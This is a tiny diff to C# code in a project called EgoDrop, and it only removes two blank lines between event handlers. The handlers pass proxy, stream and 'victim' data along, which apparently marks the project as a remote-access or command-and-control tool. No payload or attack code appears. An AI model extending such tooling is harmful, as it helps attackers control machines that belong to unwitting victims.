@@ -47,8 +47,6 @@ namespace EgoDrop
             OnProxyOpened?.Invoke(ltnProxy, nStreamId, victim, szVictimID);
         }
 
-
-
         public void fnOnRecvVictimData(clsLtnProxy ltnProxy, int nStreamId, clsVictim victim, string szVictimID, byte[] abData)
         {
             OnRecvVictimData?.Invoke(ltnProxy, nStreamId, victim, szVictimID, abData);
